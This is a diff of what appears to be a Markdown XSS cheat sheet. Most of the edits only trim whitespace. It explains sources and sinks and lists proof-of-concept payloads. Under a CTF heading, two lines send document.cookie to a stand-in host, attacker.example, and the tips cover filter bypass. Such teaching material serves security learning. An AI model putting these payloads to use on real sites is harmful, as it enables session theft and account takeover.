@@ -14,7 +14,7 @@ toc: true
 
 ## Introduction
 
-**Cross-Site Scripting (XSS)** vulnerabilities allow attackers to inject JavaScript into a webpage viewed by other users.  
+**Cross-Site Scripting (XSS)** vulnerabilities allow attackers to inject JavaScript into a webpage viewed by other users.
 They commonly appear in parameters, forms, or stored data without proper output sanitization.
 
 ---
@@ -29,12 +29,12 @@ They commonly appear in parameters, forms, or stored data without proper output 
 
 ---
 
-## Sources and Sinks
+## Sources and Sinks
 
-- **Sources** - Where user data *enters the page logic*, such as: `location.hash`, `document.URL`, `document.referrer`
-- **Sinks** - Where that data *is written to the page*, like: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `Element.innerText`
+- **Sources** - Where user data *enters the page logic*, such as: `location.hash`, `document.URL`, `document.referrer`
+- **Sinks** - Where that data *is written to the page*, like: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `Element.innerText`
 
-**Rule of thumb:** Danger arises when untrusted data enters a Source to a Sink without sanitization.
+**Rule of thumb:** Danger arises when untrusted data enters a Source to a Sink without sanitization.
 
 ---
 
@@ -50,25 +50,25 @@ They commonly appear in parameters, forms, or stored data without proper output 
 
 ---
 
-## Common Payloads
+## Common Payloads
 
-### Basic Proofs of Concept
+### Basic Proofs of Concept
 
 ```html
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(document.domain)>
-<a href="javascript:alert(document.cookie)">Click Me</a>
+<a href="javascript:alert(document.cookie)">Click Me</a>
 ```
 
-### Cookie or Data Exfiltration (CTF Exercises)
+### Cookie or Data Exfiltration (CTF Exercises)
 
-**Redirect and log cookie:**
+**Redirect and log cookie:**
 
 ```javascript
 document.location = "https://attacker.example/?c=" + document.cookie
 ```
 
-**Stealth exfiltration via image request:**
+**Stealth exfiltration via image request:**
 
 ```javascript
 document.write('<img src="https://attacker.example/collect.gif?cookie=' + document.cookie + '">')
@@ -95,6 +95,6 @@ Visiting `https://target/#<img src=x onerror=alert(1)>` executes the script enti
 
 ## Tips
 
-- Use the browser’s developer console to observe reflected parameters.  
-- Encode payloads for bypass: `&lt;script&gt;alert(1)&lt;/script&gt;`  
-- Bypass filters with alternate encodings or event handlers (`onfocus`, `onmouseover`).  
+- Use the browser’s developer console to observe reflected parameters.
+- Encode payloads for bypass: `&lt;script&gt;alert(1)&lt;/script&gt;`
+- Bypass filters with alternate encodings or event handlers (`onfocus`, `onmouseover`).
